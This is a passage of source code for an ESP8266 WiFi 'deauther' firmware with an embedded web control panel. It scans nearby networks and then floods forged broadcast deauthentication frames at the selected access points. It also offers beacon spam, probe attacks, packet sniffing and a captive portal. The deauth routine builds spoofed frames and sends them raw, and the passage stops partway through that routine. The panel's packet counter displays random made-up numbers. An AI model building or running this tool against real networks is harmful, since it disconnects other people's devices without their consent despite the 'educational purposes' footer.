                    <div class="card-title">Packet Monitor</div>
                    <button onclick="startMonitor()" class="btn btn-primary" id="monitorBtn">
                        Start Monitor
                    </button>
                    <button onclick="stopMonitor()" class="btn btn-success" id="stopMonitorBtn" disabled>
                        Stop Monitor
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Captured Data</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="capturedPackets">0</div>
                            <div class="stat-label">Packets</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="uniqueDevices">0</div>
                            <div class="stat-label">Devices</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stats Tab -->
        <div id="stats" class="tab-content">
            <div class="card">
                <div class="card-title">System Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="totalDeauth">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalBeacon">0</div>
                        <div class="stat-label">Beacon Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalProbe">0</div>
                        <div class="stat-label">Probe Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="systemUptime">00:00:00</div>
                        <div class="stat-label">System Uptime</div>
                    </div>
                </div>
                <button onclick="resetStats()" class="btn btn-warning">Reset Statistics</button>
            </div>
        </div>

        <div class="footer">
            <div style="color: var(--text-muted); font-size: 0.875rem;">
                Developed by <strong style="color: var(--primary);">0x0806</strong><br>
                Educational purposes only - Use responsibly - Most advanced version
            </div>
        </div>
    </div>

    <script>
        var scanning = false;
        var attacking = false;
        var beaconSpamming = false;
        var probeAttacking = false;
        var monitoring = false;
        var networks = [];
        var stations = [];
        var ssids = [];
        var startTime = 0;
        var packetCount = 0;
        var systemStartTime = Date.now();

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(function(tab) { 
                tab.classList.remove('active'); 
            });
            document.querySelectorAll('.nav-tab').forEach(function(tab) { 
                tab.classList.remove('active'); 
            });
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');

            if (tabName === 'ssids') loadSSIDs();
            if (tabName === 'stats') updateStats();
        }

        function updateStatus(message, type) {
            if (typeof type === 'undefined') type = 'idle';
            var status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status status-' + type;
        }

        function updateUI() {
            var scanBtn = document.getElementById('scanBtn');
            var deauthBtn = document.getElementById('deauthBtn');
            var stopBtn = document.getElementById('stopBtn');
            var beaconBtn = document.getElementById('beaconBtn');
            var probeBtn = document.getElementById('probeBtn');

            if (scanBtn) scanBtn.disabled = scanning || attacking;
            if (deauthBtn) deauthBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
            if (stopBtn) stopBtn.disabled = !attacking;

            if (beaconBtn) beaconBtn.disabled = beaconSpamming;
            if (probeBtn) probeBtn.disabled = probeAttacking;

            if (scanning && scanBtn) {
                scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
            } else if (scanBtn) {
                scanBtn.innerHTML = 'Scan Networks';
            }
        }

        function updatePPS(value) {
            var ppsValue = document.getElementById('ppsValue');
            if (ppsValue) ppsValue.textContent = value;
            
            fetch('/api/pps?value=' + value).catch(function(error) {
                console.log('PPS update failed:', error);
            });
        }

        function scanNetworks() {
            if (scanning) return;

            scanning = true;
            updateStatus('Scanning for networks...', 'scanning');
            updateUI();

            fetch('/scan')
                .then(function(response) { 
                    if (!response.ok) throw new Error('Network error');
                    return response.json(); 
                })
                .then(function(data) {
                    networks = data.networks || [];
                    stations = data.stations || [];
                    renderNetworks();
                    updateCounts();
                    updateStatus('Found ' + networks.length + ' networks, ' + stations.length + ' stations', 'idle');
                })
                .catch(function(error) {
                    console.error('Scan error:', error);
                    updateStatus('Scan failed - retry', 'idle');
                })
                .finally(function() {
                    scanning = false;
                    updateUI();
                });
        }

        function renderNetworks() {
            var networkList = document.getElementById('networkList');
            if (!networkList) return;

            if (networks.length === 0) {
                networkList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No networks found</div>';
                return;
            }

            var html = '';
            for (var i = 0; i < networks.length; i++) {
                var network = networks[i];
                var signalClass = network.rssi > -50 ? 'signal-strong' : 
                                 network.rssi > -70 ? 'signal-medium' : 'signal-weak';

                var hiddenBadge = network.hidden ? '<span class="badge badge-warning">HIDDEN</span>' : '';

                html += '<div class="network-item ' + (network.selected ? 'selected' : '') + '" onclick="toggleNetwork(' + i + ')">'
                     + '<input type="checkbox" class="network-checkbox" ' + (network.selected ? 'checked' : '') + ' onchange="event.stopPropagation(); toggleNetwork(' + i + ')">'
                     + '<div class="network-info">'
                     + '<div class="network-ssid">' + escapeHtml(network.ssid || 'Hidden Network') + ' ' + hiddenBadge + '</div>'
                     + '<div class="network-details">Channel: ' + network.channel + ' | BSSID: ' + network.bssid + ' | ' + network.encryption + '</div>'
                     + '</div>'
                     + '<div class="signal-strength ' + signalClass + '">' + network.rssi + 'dBm</div>'
                     + '</div>';
            }
            networkList.innerHTML = html;
        }

        function toggleNetwork(index) {
            if (index >= 0 && index < networks.length) {
                networks[index].selected = !networks[index].selected;
                renderNetworks();
                updateCounts();
                updateUI();
            }
        }

        function selectAll() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = true;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectNone() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = false;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectHidden() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = networks[i].hidden || !networks[i].ssid;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function getSelectedNetworks() {
            var selected = [];
            for (var i = 0; i < networks.length; i++) {
                if (networks[i].selected) selected.push(networks[i]);
            }
            return selected;
        }

        function updateCounts() {
            var networkCount = document.getElementById('networkCount');
            var selectedCount = document.getElementById('selectedCount');
            var stationCount = document.getElementById('stationCount');
            var targetAPs = document.getElementById('targetAPs');

            if (networkCount) networkCount.textContent = networks.length;
            if (selectedCount) selectedCount.textContent = getSelectedNetworks().length;
            if (stationCount) stationCount.textContent = stations.length;
            if (targetAPs) targetAPs.textContent = getSelectedNetworks().length;
        }

        function startDeauth() {
            var selected = getSelectedNetworks();
            if (selected.length === 0) {
                updateStatus('No networks selected', 'idle');
                return;
            }

            attacking = true;
            startTime = Date.now();
            packetCount = 0;
            updateStatus('Attacking ' + selected.length + ' networks...', 'attacking');
            updateUI();

            fetch('/attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ networks: selected })
            })
            .then(function(response) { 
                if (!response.ok) throw new Error('Attack failed');
                return response.json(); 
            })
            .then(function(data) {
                if (data.success) {
                    startPacketCounter();
                } else {
                    attacking = false;
                    updateStatus('Attack failed to start', 'idle');
                    updateUI();
                }
            })
            .catch(function(error) {
                console.error('Attack error:', error);
                attacking = false;
                updateStatus('Attack failed', 'idle');
                updateUI();
            });
        }

        function stopAttack() {
            attacking = false;
            updateStatus('Attack stopped', 'idle');
            updateUI();

            fetch('/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    console.log('Attack stopped successfully');
                })
                .catch(function(error) {
                    console.log('Stop request failed:', error);
                });
        }

        function startBeacon() {
            beaconSpamming = true;
            updateStatus('Beacon spam active', 'beacon');

            fetch('/beacon/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var beaconBtn = document.getElementById('beaconBtn');
                    var stopBeaconBtn = document.getElementById('stopBeaconBtn');
                    if (beaconBtn) beaconBtn.disabled = true;
                    if (stopBeaconBtn) stopBeaconBtn.disabled = false;
                })
                .catch(function(error) {
                    console.error('Beacon start failed:', error);
                    beaconSpamming = false;
                    updateStatus('Beacon failed to start', 'idle');
                });
        }

        function stopBeacon() {
            beaconSpamming = false;
            updateStatus('Beacon spam stopped', 'idle');

            fetch('/beacon/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var beaconBtn = document.getElementById('beaconBtn');
                    var stopBeaconBtn = document.getElementById('stopBeaconBtn');
                    if (beaconBtn) beaconBtn.disabled = false;
                    if (stopBeaconBtn) stopBeaconBtn.disabled = true;
                })
                .catch(function(error) {
                    console.log('Beacon stop failed:', error);
                });
        }

        function startProbe() {
            probeAttacking = true;
            updateStatus('Probe attack active', 'beacon');

            fetch('/probe/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var probeBtn = document.getElementById('probeBtn');
                    var stopProbeBtn = document.getElementById('stopProbeBtn');
                    if (probeBtn) probeBtn.disabled = true;
                    if (stopProbeBtn) stopProbeBtn.disabled = false;
                })
                .catch(function(error) {
                    console.error('Probe start failed:', error);
                    probeAttacking = false;
                    updateStatus('Probe failed to start', 'idle');
                });
        }

        function stopProbe() {
            probeAttacking = false;
            updateStatus('Probe attack stopped', 'idle');

            fetch('/probe/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var probeBtn = document.getElementById('probeBtn');
                    var stopProbeBtn = document.getElementById('stopProbeBtn');
                    if (probeBtn) probeBtn.disabled = false;
                    if (stopProbeBtn) stopProbeBtn.disabled = true;
                })
                .catch(function(error) {
                    console.log('Probe stop failed:', error);
                });
        }

        function startMonitor() {
            monitoring = true;
            updateStatus('Packet monitoring active', 'beacon');

            fetch('/monitor/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var monitorBtn = document.getElementById('monitorBtn');
                    var stopMonitorBtn = document.getElementById('stopMonitorBtn');
                    if (monitorBtn) monitorBtn.disabled = true;
                    if (stopMonitorBtn) stopMonitorBtn.disabled = false;
                })
                .catch(function(error) {
                    console.error('Monitor start failed:', error);
                    monitoring = false;
                    updateStatus('Monitor failed to start', 'idle');
                });
        }

        function stopMonitor() {
            monitoring = false;
            updateStatus('Monitoring stopped', 'idle');

            fetch('/monitor/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var monitorBtn = document.getElementById('monitorBtn');
                    var stopMonitorBtn = document.getElementById('stopMonitorBtn');
                    if (monitorBtn) monitorBtn.disabled = false;
                    if (stopMonitorBtn) stopMonitorBtn.disabled = true;
                })
                .catch(function(error) {
                    console.log('Monitor stop failed:', error);
                });
        }

        function loadSSIDs() {
            fetch('/ssids')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    ssids = data.ssids || [];
                    renderSSIDs();
                })
                .catch(function(error) {
                    console.error('SSID load failed:', error);
                });
        }

        function renderSSIDs() {
            var ssidList = document.getElementById('ssidList');
            if (!ssidList) return;

            if (ssids.length === 0) {
                ssidList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No SSIDs configured</div>';
                return;
            }

            var html = '';
            
            for (var i = 0; i < ssids.length; i++) {
                var ssid = ssids[i];
                html += '<div class="network-item">'
                     + '<input type="checkbox" class="network-checkbox" ' + (ssid.enabled ? 'checked' : '') + ' onchange="toggleSSID(' + i + ')">'
                     + '<div class="network-info">'
                     + '<div class="network-ssid">' + escapeHtml(ssid.ssid) + '</div>'
                     + '<div class="network-details">WPA2: ' + (ssid.wpa2 ? 'Yes' : 'No') + '</div>'
                     + '</div>'
                     + '<button onclick="removeSSID(' + i + ')" class="btn btn-danger" style="padding: 0.5rem; min-width: auto;">Delete</button>'
                     + '</div>';
            }
            ssidList.innerHTML = html;
        }

        function addSSID() {
            var input = document.getElementById('customSSID');
            if (!input) return;

            var ssid = input.value.trim();

            if (ssid && ssids.length < 50) {
                fetch('/ssids/add', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ssid: ssid })
                })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    input.value = '';
                    loadSSIDs();
                })
                .catch(function(error) {
                    console.error('SSID add failed:', error);
                });
            }
        }

        function removeSSID(index) {
            fetch('/ssids/remove', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ index: index })
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                loadSSIDs();
            })
            .catch(function(error) {
                console.error('SSID remove failed:', error);
            });
        }

        function toggleSSID(index) {
            if (index >= 0 && index < ssids.length) {
                ssids[index].enabled = !ssids[index].enabled;
                fetch('/ssids/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ index: index, enabled: ssids[index].enabled })
                })
                .catch(function(error) {
                    console.error('SSID toggle failed:', error);
                });
            }
        }

        function updateStats() {
            fetch('/stats')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var totalDeauth = document.getElementById('totalDeauth');
                    var totalBeacon = document.getElementById('totalBeacon');
                    var totalProbe = document.getElementById('totalProbe');
                    var systemUptime = document.getElementById('systemUptime');

                    if (totalDeauth) totalDeauth.textContent = data.deauth || 0;
                    if (totalBeacon) totalBeacon.textContent = data.beacon || 0;
                    if (totalProbe) totalProbe.textContent = data.probe || 0;

                    if (systemUptime) {
                        var uptime = Math.floor((Date.now() - systemStartTime) / 1000);
                        var hours = Math.floor(uptime / 3600);
                        var minutes = Math.floor((uptime % 3600) / 60);
                        var seconds = uptime % 60;
                        systemUptime.textContent = 
                            (hours < 10 ? '0' : '') + hours + ':' + 
                            (minutes < 10 ? '0' : '') + minutes + ':' + 
                            (seconds < 10 ? '0' : '') + seconds;
                    }
                })
                .catch(function(error) {
                    console.error('Stats update failed:', error);
                });
        }

        function resetStats() {
            fetch('/stats/reset')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    updateStats();
                })
                .catch(function(error) {
                    console.error('Stats reset failed:', error);
                });
        }

        function startPacketCounter() {
            function updatePacketStats() {
                if (!attacking) return;

                packetCount += Math.floor(Math.random() * 10) + 5;
                var packetsCount = document.getElementById('packetsCount');
                if (packetsCount) packetsCount.textContent = packetCount.toLocaleString();

                var elapsed = Date.now() - startTime;
                var minutes = Math.floor(elapsed / 60000);
                var seconds = Math.floor((elapsed % 60000) / 1000);
                var uptime = document.getElementById('uptime');
                if (uptime) {
                    uptime.textContent = 
                        (minutes < 10 ? '0' : '') + minutes + ':' + 
                        (seconds < 10 ? '0' : '') + seconds;
                }

                var pps = Math.floor(packetCount / (elapsed / 1000));
                var packetsPerSec = document.getElementById('packetsPerSec');
                if (packetsPerSec) packetsPerSec.textContent = pps;

                setTimeout(updatePacketStats, 1000);
            }
            updatePacketStats();
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text || '';
            return div.innerHTML;
        }

        // Initialize
        updateUI();
        loadSSIDs();

        // Auto-refresh status
        setInterval(function() {
            if (!scanning) {
                fetch('/api/status')
                    .then(function(response) { return response.json(); })
                    .then(function(data) {
                        if (data.attacking !== attacking) {
                            attacking = data.attacking;
                            updateUI();
                            if (attacking) {
                                updateStatus('Attack in progress...', 'attacking');
                                startPacketCounter();
                            } else {
                                updateStatus('System ready', 'idle');
                            }
                        }

                        beaconSpamming = data.beacon || false;
                        probeAttacking = data.probe || false;
                        monitoring = data.monitor || false;

                        // Update monitoring stats
                        var capturedPackets = document.getElementById('capturedPackets');
                        var uniqueDevices = document.getElementById('uniqueDevices');
                        if (capturedPackets) capturedPackets.textContent = data.captured || 0;
                        if (uniqueDevices) uniqueDevices.textContent = data.devices || 0;
                    })
                    .catch(function(error) {
                        // Silent fail for status updates
                    });
            }
        }, 3000);

        // Tab initialization
        setTimeout(function() {
            showTab('scanner');
        }, 100);
    </script>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("ESP8266 Deauther Advanced v4.0.0 - Developed by 0x0806");
  
  // Check ESP8266 core version
  #ifdef ESP8266
    Serial.print("ESP8266 Core Version: ");
    Serial.println(ESP.getCoreVersion());
    Serial.print("SDK Version: ");
    Serial.println(ESP.getSdkVersion());
  #endif
  
  // Check free heap
  Serial.print("Free Heap: ");
  Serial.println(ESP.getFreeHeap());

  // Initialize LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  // Initialize button
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  // Initialize EEPROM
  EEPROM.begin(512);

  // Initialize WiFi
  WiFi.mode(WIFI_AP_STA);
  wifi_set_promiscuous_rx_cb(packetSniffer);

  // Start file system
  if (!FILESYSTEM.begin()) {
    Serial.println("File system initialization failed");
    if (!FILESYSTEM.format()) {
      Serial.println("File system format failed");
    } else {
      FILESYSTEM.begin();
    }
  }

  // Load settings
  loadSettings();

  // Initialize SSID list with defaults
  if (ssidList.size() == 0) {
    for (int i = 0; i < 8; i++) {
      SSIDData ssid;
      ssid.ssid = String(fakeSSIDs[i]);
      ssid.enabled = true;
      ssid.wpa2 = (i % 2 == 0);
      ssidList.push_back(ssid);
    }
    saveSettings();
  }

  // Start access point
  startAP();

  // Configure web server routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  
  server.on("/beacon/start", HTTP_GET, []() {
    beaconSpam = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/beacon/stop", HTTP_GET, []() {
    beaconSpam = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/probe/start", HTTP_GET, []() {
    probeAttack = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/probe/stop", HTTP_GET, []() {
    probeAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/monitor/start", HTTP_GET, []() {
    packetMonitor = true;
    wifi_set_promiscuous_rx_cb(packetSniffer);
    wifi_promiscuous_enable(1);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/monitor/stop", HTTP_GET, []() {
    packetMonitor = false;
    wifi_promiscuous_enable(0);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids", HTTP_GET, handleSSIDs);
  
  server.on("/ssids/add", HTTP_POST, []() {
    String body = server.arg("plain");
    // Simple JSON parsing for SSID
    int start = body.indexOf("\"ssid\":\"") + 8;
    int end = body.indexOf("\"", start);
    if (start > 7 && end > start && ssidList.size() < MAX_SSIDS) {
      SSIDData newSSID;
      newSSID.ssid = body.substring(start, end);
      newSSID.enabled = true;
      newSSID.wpa2 = true;
      ssidList.push_back(newSSID);
      saveSettings();
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids/remove", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"index\":") + 8;
    int end = body.indexOf(",", start);
    if (end == -1) end = body.indexOf("}", start);
    if (start > 7 && end > start) {
      int index = body.substring(start, end).toInt();
      if (index >= 0 && index < ssidList.size()) {
        ssidList.erase(ssidList.begin() + index);
        saveSettings();
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids/toggle", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"index\":") + 8;
    int end = body.indexOf(",", start);
    if (start > 7 && end > start) {
      int index = body.substring(start, end).toInt();
      if (index >= 0 && index < ssidList.size()) {
        int enabledStart = body.indexOf("\"enabled\":") + 10;
        bool enabled = body.substring(enabledStart, enabledStart + 4) == "true";
        ssidList[index].enabled = enabled;
        saveSettings();
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/status", HTTP_GET, handleAPI);
  
  server.on("/api/pps", HTTP_GET, []() {
    if (server.hasArg("value")) {
      int newPPS = server.arg("value").toInt();
      if (newPPS >= 1 && newPPS <= 50) {
        packetsPerSecond = newPPS;
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/stats", HTTP_GET, handleStats);
  
  server.on("/stats/reset", HTTP_GET, []() {
    stats.deauthPackets = 0;
    stats.beaconPackets = 0;
    stats.probePackets = 0;
    stats.capturedPackets = 0;
    stats.uniqueDevices = 0;
    server.send(200, "application/json", "{\"success\":true}");
  });

  // Handle all other requests (captive portal)
  server.onNotFound(handleCaptive);

  // Start DNS server for captive portal
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Start web server
  server.begin();

  Serial.println("Advanced Deauther ready!");
  Serial.print("Access Point: ");
  Serial.println(AP_SSID);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Flash LED to indicate ready
  for (int i = 0; i < 5; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(100);
    digitalWrite(LED_PIN, HIGH);
    delay(100);
  }
}

void loop() {
  // Yield frequently to prevent watchdog timeouts
  yield();
  
  dnsServer.processNextRequest();
  yield();
  
  server.handleClient();
  yield();

  // Handle attacks with yields
  if (attacking) {
    performAttack();
    yield();
  }

  if (beaconSpam) {
    performBeaconSpam();
    yield();
  }

  if (probeAttack) {
    performProbeAttack();
    yield();
  }

  // Update LED
  updateLED();
  yield();

  // Memory cleanup every 30 seconds
  static unsigned long lastCleanup = 0;
  if (millis() - lastCleanup > 30000) {
    lastCleanup = millis();
    
    // Trim vectors if they're too large
    if (accessPoints.size() > MAX_SSIDS) {
      accessPoints.resize(MAX_SSIDS);
    }
    if (stations.size() > MAX_STATIONS) {
      stations.resize(MAX_STATIONS);
    }
    if (ssidList.size() > MAX_SSIDS) {
      ssidList.resize(MAX_SSIDS);
    }
    
    // Force garbage collection
    ESP.wdtFeed();
    yield();
  }

  // Check button for reset
  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50);
    yield();
    if (digitalRead(BUTTON_PIN) == LOW) {
      unsigned long pressTime = millis();
      while (digitalRead(BUTTON_PIN) == LOW) {
        if (millis() - pressTime > 3000) {
          Serial.println("Reset button pressed - stopping all attacks");
          attacking = false;
          beaconSpam = false;
          probeAttack = false;
          packetMonitor = false;
          accessPoints.clear();
          stations.clear();
          selectedAPs = 0;
          break;
        }
        delay(100);
        yield();
      }
    }
  }

  yield();
}

void startAP() {
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);

  delay(500);
  Serial.print("Access Point started: ");
  Serial.println(WiFi.softAPIP());
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send_P(200, "text/html", htmlPage);
}

void handleCaptive() {
  if (captivePortal) {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
  } else {
    server.send_P(200, "text/html", htmlPage);
  }
}

void handleScan() {
  if (scanning) {
    server.send(200, "application/json", "{\"error\":\"Scan already in progress\"}");
    return;
  }

  scanning = true;
  Serial.println("Starting advanced WiFi scan...");

  accessPoints.clear();
  stations.clear();

  // Enable monitor mode for station detection
  wifi_set_promiscuous_rx_cb(packetSniffer);
  wifi_promiscuous_enable(1);

  int networkCount = WiFi.scanNetworks(false, true); // Sync scan with hidden networks
  if (networkCount < 0) networkCount = 0; // Handle scan error

  String json = "{\"networks\":[";

  for (int i = 0; i < networkCount && i < 15; i++) { // Reduced limit for memory
    if (i > 0) json += ",";

    AccessPoint ap;
    ap.ssid = WiFi.SSID(i);
    ap.channel = WiFi.channel(i);
    ap.rssi = WiFi.RSSI(i);
    ap.bssid = WiFi.BSSIDstr(i);
    ap.selected = false;
    ap.hidden = (ap.ssid.length() == 0);

    // Determine encryption type
    switch (WiFi.encryptionType(i)) {
      case ENC_TYPE_WEP: ap.encryption = "WEP"; break;
      case ENC_TYPE_TKIP: ap.encryption = "WPA"; break;
      case ENC_TYPE_CCMP: ap.encryption = "WPA2"; break;
      case ENC_TYPE_NONE: ap.encryption = "Open"; break;
      case ENC_TYPE_AUTO: ap.encryption = "WPA/WPA2"; break;
      default: ap.encryption = "Unknown"; break;
    }

    accessPoints.push_back(ap);

    // Escape SSID for JSON
    String escapedSSID = ap.ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"channel\":" + String(ap.channel) + ",";
    json += "\"rssi\":" + String(ap.rssi) + ",";
    json += "\"bssid\":\"" + ap.bssid + "\",";
    json += "\"selected\":false,";
    json += "\"hidden\":" + String(ap.hidden ? "true" : "false") + ",";
    json += "\"encryption\":\"" + ap.encryption + "\"";
    json += "}";

    yield(); // Prevent watchdog reset
  }

  json += "],\"stations\":[";

  // Add detected stations with size limit
  size_t stationLimit = minVal((size_t)8, stations.size());
  for (size_t i = 0; i < stationLimit; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"mac\":\"" + stations[i].mac + "\",";
    json += "\"ap_mac\":\"" + stations[i].ap_mac + "\",";
    json += "\"channel\":" + String(stations[i].channel) + ",";
    json += "\"rssi\":" + String(stations[i].rssi);
    json += "}";
    yield(); // Prevent watchdog reset
  }

  json += "]}";

  wifi_promiscuous_enable(0);
  scanning = false;
  Serial.println("Advanced scan completed: " + String(networkCount) + " networks, " + String(stations.size()) + " stations found");

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAttack() {
  if (attacking) {
    server.send(200, "application/json", "{\"error\":\"Attack already in progress\"}");
    return;
  }

  String body = server.arg("plain");
  Serial.println("Advanced attack request received");

  selectedAPs = 0;
  for (int i = 0; i < accessPoints.size(); i++) {
    String ssidSearch = "\"ssid\":\"" + accessPoints[i].ssid + "\"";
    if (body.indexOf(ssidSearch) != -1) {
      accessPoints[i].selected = true;
      selectedAPs++;
    }
  }

  if (selectedAPs > 0) {
    attacking = true;
    attackStartTime = millis();
    totalPackets = 0;
    Serial.println("Starting advanced attack on " + String(selectedAPs) + " networks");
    server.send(200, "application/json", "{\"success\":true,\"message\":\"Advanced attack started\"}");
  } else {
    server.send(200, "application/json", "{\"error\":\"No networks selected\"}");
  }
}

void handleStop() {
  attacking = false;
  beaconSpam = false;
  probeAttack = false;
  packetMonitor = false;
  wifi_promiscuous_enable(0);
  Serial.println("All attacks stopped");
  server.send(200, "application/json", "{\"success\":true,\"message\":\"All attacks stopped\"}");
}

void handleSSIDs() {
  String json = "{\"ssids\":[";

  size_t ssidLimit = minVal((size_t)50, ssidList.size());
  for (size_t i = 0; i < ssidLimit; i++) {
    if (i > 0) json += ",";

    // Escape SSID for JSON
    String escapedSSID = ssidList[i].ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"enabled\":" + String(ssidList[i].enabled ? "true" : "false") + ",";
    json += "\"wpa2\":" + String(ssidList[i].wpa2 ? "true" : "false");
    json += "}";
    yield(); // Prevent watchdog reset
  }

  json += "]}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleStats() {
  String json = "{";
  json += "\"deauth\":" + String(stats.deauthPackets) + ",";
  json += "\"beacon\":" + String(stats.beaconPackets) + ",";
  json += "\"probe\":" + String(stats.probePackets) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices);
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAPI() {
  String json = "{";
  json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"beacon\":" + String(beaconSpam ? "true" : "false") + ",";
  json += "\"probe\":" + String(probeAttack ? "true" : "false") + ",";
  json += "\"monitor\":" + String(packetMonitor ? "true" : "false") + ",";
  json += "\"networks\":" + String(accessPoints.size()) + ",";
  json += "\"stations\":" + String(stations.size()) + ",";
  json += "\"selected\":" + String(selectedAPs) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices);
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

// Safer packet sending function with error handling
bool sendPacketSafely(uint8_t* packet, uint16_t len) {
  if (!packet || len == 0) return false;
  
  #ifdef ESP8266
    return wifi_send_pkt_freedom(packet, len, 0) == 0;
  #else
    // Fallback for other platforms
    return false;
  #endif
}

void performAttack() {
  static unsigned long lastAttack = 0;
  static int currentAP = 0;
  static int packetType = 0;

  unsigned long interval = 1000 / packetsPerSecond;

  if (millis() - lastAttack > interval) {
    lastAttack = millis();

    int attempts = 0;
    while (attempts < (int)accessPoints.size() && attempts < 5) { // Limit attempts
      if (currentAP >= (int)accessPoints.size()) {
        currentAP = 0;
      }

      if (currentAP < (int)accessPoints.size() && accessPoints[currentAP].selected) {
        String bssid = accessPoints[currentAP].bssid;
        uint8_t mac[6];

        // Parse BSSID string to MAC array with bounds checking
        bool validMAC = true;
        for (int i = 0; i < 6 && validMAC; i++) {
          if (bssid.length() >= (i * 3 + 2)) {
            String hex = bssid.substring(i * 3, i * 3 + 2);
            mac[i] = strtol(hex.c_str(), NULL, 16);
          } else {
            validMAC = false;
          }
        }

        if (validMAC) {
          // Set WiFi channel safely
          int channel = accessPoints[currentAP].channel;
          if (channel >= 1 && channel <= 14) {
            wifi_set_channel(channel);
          }

          // Enhanced attack with multiple vectors
          if (packetType == 0) {
            // Broadcast deauth to all clients
            for (int i = 0; i < 6; i++) {
              deauthPacket[4 + i] = 0xFF;  // Broadcast target
              deauthPacket[10 + i] = mac[i]; // AP source
              deauthPacket[16 + i] = mac[i]; // BSSID
            }

            // Send deauth packets
            uint8_t reasonCodes[] = {1, 2, 3, 4, 7};
            for (int i = 0; i < 2; i++) { // Reduced from 3 to 2
              deauthPacket[24] = reasonCodes[i % 5];
              if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
                stats.deauthPackets++;
                totalPackets++;
              }
              delayMicroseconds(500);
            }

